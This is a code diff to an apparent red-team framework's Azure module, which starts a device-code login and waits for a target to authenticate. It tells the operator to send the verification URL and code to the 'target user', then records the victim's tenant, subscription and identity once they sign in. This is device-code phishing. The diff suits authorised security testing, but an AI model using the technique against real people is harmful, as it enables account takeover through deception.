@@ -2,13 +2,49 @@ from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique, Azu
 from ..technique_registry import TechniqueRegistry
 from typing import Dict, Any, Tuple
 from core.azure.azure_access import AzureAccess
+from core.output_manager.output_manager import OutputManager
 import subprocess
 import json
 import time
 import re
 from multiprocessing import Process
 
-def monitor_device_code_authentication(az_command, device_code_data, timeout_seconds):
+def extract_device_code_info(raw_output):
+    """Extract device login URL and user code from Azure CLI output."""
+    if not raw_output:
+        return None
+
+    user_code = None
+    verification_url = None
+
+    user_code_patterns = [
+        r"enter the code\s+([A-Z0-9-]+)",
+        r"user code[:\s]+([A-Z0-9-]+)",
+    ]
+
+    for pattern in user_code_patterns:
+        match = re.search(pattern, raw_output, re.IGNORECASE)
+        if match:
+            user_code = match.group(1).strip().rstrip(".,;:")
+            break
+
+    urls = re.findall(r"https://[^\s]+", raw_output, re.IGNORECASE)
+    cleaned_urls = [url.rstrip(").,;:") for url in urls]
+    preferred_urls = [url for url in cleaned_urls if "device" in url.lower()]
+    if preferred_urls:
+        verification_url = preferred_urls[0]
+    elif cleaned_urls:
+        verification_url = cleaned_urls[0]
+
+    if user_code and verification_url:
+        return {
+            "user_code": user_code,
+            "verification_url": verification_url
+        }
+
+    return None
+
+def monitor_device_code_authentication(az_command, az_env, technique_name, event_id, device_code_data, timeout_seconds):
     """Background process to monitor device code authentication completion"""
     start_time = time.time()
     print(f"[AzureEstablishAccessViaDeviceCode] Starting authentication monitoring for device code: {device_code_data.get('user_code', 'Unknown')}")
@@ -20,18 +56,45 @@ def monitor_device_code_authentication(az_command, device_code_data, timeout_sec
                 [az_command, "account", "show"], 
                 capture_output=True, 
                 text=True, 
-                timeout=10
+                timeout=10,
+                env=az_env
             )
             
             if result.returncode == 0:
                 # Authentication successful - get account info
                 try:
                     account_info = json.loads(result.stdout)
+                    OutputManager().store_technique_output(
+                        data={
+                            "instruction": "Authentication completed successfully and the Azure CLI session is now available to Halberd.",
+                            "authentication_status": "authenticated",
+                            "verification_url": device_code_data.get("verification_url"),
+                            "user_code": device_code_data.get("user_code"),
+                            "tenant_id": account_info.get("tenantId", "Unknown"),
+                            "subscription_name": account_info.get("name", "Unknown"),
+                            "subscription_id": account_info.get("id", "Unknown"),
+                            "identity": account_info.get("user", {}).get("name", "Unknown"),
+                            "identity_type": account_info.get("user", {}).get("type", "Unknown")
+                        },
+                        technique_name=technique_name,
+                        event_id=event_id
+                    )
                     print(f"[AzureEstablishAccessViaDeviceCode] Authentication successful for user: {account_info.get('user', {}).get('name', 'Unknown')}")
                     print(f"[AzureEstablishAccessViaDeviceCode] Tenant: {account_info.get('tenantId', 'Unknown')}")
                     print(f"[AzureEstablishAccessViaDeviceCode] Subscription: {account_info.get('name', 'Unknown')}")
                     return True
                 except json.JSONDecodeError:
+                    OutputManager().store_technique_output(
+                        data={
+                            "instruction": "Authentication completed successfully, but Halberd could not parse the Azure CLI account details.",
+                            "authentication_status": "authenticated",
+                            "verification_url": device_code_data.get("verification_url"),
+                            "user_code": device_code_data.get("user_code"),
+                            "raw_output": result.stdout.strip()
+                        },
+                        technique_name=technique_name,
+                        event_id=event_id
+                    )
                     print("[AzureEstablishAccessViaDeviceCode] Authentication successful (could not parse account details)")
                     return True
                 
@@ -42,6 +105,17 @@ def monitor_device_code_authentication(az_command, device_code_data, timeout_sec
         # Wait before next check
         time.sleep(10)
     
+    OutputManager().store_technique_output(
+        data={
+            "instruction": "Authentication did not complete before the monitoring window expired.",
+            "authentication_status": "timeout",
+            "verification_url": device_code_data.get("verification_url"),
+            "user_code": device_code_data.get("user_code"),
+            "timeout_seconds": timeout_seconds
+        },
+        technique_name=technique_name,
+        event_id=event_id
+    )
     print(f"[AzureEstablishAccessViaDeviceCode] Authentication monitoring timed out after {timeout_seconds} seconds")
     return False
 
@@ -102,6 +176,7 @@ class AzureEstablishAccessViaDeviceCode(BaseTechnique):
         try:
             tenant_id: str = kwargs.get('tenant_id', None)
             timeout_minutes: int = kwargs.get('timeout_minutes', 15)
+            event_id: str = kwargs.get('_event_id')
             
             if timeout_minutes in [None, ""]:
                 timeout_minutes = 15 # Set default if no value found
@@ -113,6 +188,7 @@ class AzureEstablishAccessViaDeviceCode(BaseTechnique):
             # Get Azure CLI command
             azure_access = AzureAccess()
             az_command = azure_access.az_command
+            az_env = azure_access.get_subprocess_env()
             
             if not az_command:
                 return ExecutionStatus.FAILURE, {
@@ -137,7 +213,8 @@ class AzureEstablishAccessViaDeviceCode(BaseTechnique):
                 stderr=subprocess.STDOUT,
                 text=True,
                 bufsize=1,
-                universal_newlines=True
+                universal_newlines=True,
+                env=az_env
             )
             
             # Read initial output to get device code information
@@ -157,28 +234,15 @@ class AzureEstablishAccessViaDeviceCode(BaseTechnique):
                         
                     # Try to read from stderr
                     line = process.stdout.readline()
+			
                     if line:
                         output_lines.append(line.strip())
                         
-                        # Look for device code pattern
-                        device_code_pattern = r"enter the code ([A-Z0-9-]+)"
-                        url_pattern = r"(https://microsoft\.com/devicelogin[^\s]*)"
-                        
-                        device_code_match = re.search(device_code_pattern, line, re.IGNORECASE)
-                        url_match = re.search(url_pattern, line, re.IGNORECASE)
-                        
-                        if device_code_match:
-                            user_code = device_code_match.group(1)
-                            
-                        if url_match:
-                            verification_url = url_match.group(1)
-                            
-                        # If user code and url available, proceed
-                        if user_code and verification_url:
-                            device_code_info = {
-                                "user_code": user_code,
-                                "verification_url": verification_url
-                            }
+                        extracted_info = extract_device_code_info(line)
+                        if extracted_info:
+                            user_code = extracted_info["user_code"]
+                            verification_url = extracted_info["verification_url"]
+                            device_code_info = extracted_info
                             break
                             
                 except Exception as e:
@@ -191,19 +255,10 @@ class AzureEstablishAccessViaDeviceCode(BaseTechnique):
             # If we couldn't get device code info, attempt extraction from collected output
             if not device_code_info and output_lines:
                 full_output = "\n".join(output_lines)
-                device_code_pattern = r"enter the code ([A-Z0-9-]+)"
-                url_pattern = r"(https://microsoft\.com/devicelogin[^\s]*)"
-                
-                device_code_match = re.search(device_code_pattern, full_output, re.IGNORECASE)
-                url_match = re.search(url_pattern, full_output, re.IGNORECASE)
-                
-                if device_code_match and url_match:
-                    user_code = device_code_match.group(1)
-                    verification_url = url_match.group(1)
-                    device_code_info = {
-                        "user_code": user_code,
-                        "verification_url": verification_url
-                    }
+                device_code_info = extract_device_code_info(full_output)
+                if device_code_info:
+                    user_code = device_code_info["user_code"]
+                    verification_url = device_code_info["verification_url"]
             
             # If still no device code info, return failure
             if not device_code_info:
@@ -223,9 +278,8 @@ class AzureEstablishAccessViaDeviceCode(BaseTechnique):
             timeout_seconds = timeout_minutes * 60
             monitoring_process = Process(
                 target=monitor_device_code_authentication,
-                args=(az_command, device_code_info, timeout_seconds)
+                args=(az_command, az_env, self.__class__.__name__, event_id, device_code_info, timeout_seconds)
             )
-            monitoring_process.daemon = True
             monitoring_process.start()
             
             # Return device code information as technique output
@@ -235,7 +289,7 @@ class AzureEstablishAccessViaDeviceCode(BaseTechnique):
                     "instruction": "Send the verification URL and user code to the target user. Authentication will be monitored automatically.",
                     "verification_url": verification_url,
                     "user_code": user_code,
-                    "note": f"The device code is valid for {timeout_minutes} minutes. Background monitoring is active for authentication completion.",
+                    "note": f"The device code is valid for {timeout_minutes} minutes. Halberd will update the stored execution output when authentication is detected.",
                     "timeout_minutes": timeout_minutes,
                     "monitoring": "Background process started to monitor authentication status",
                     "target_tenant": tenant_id
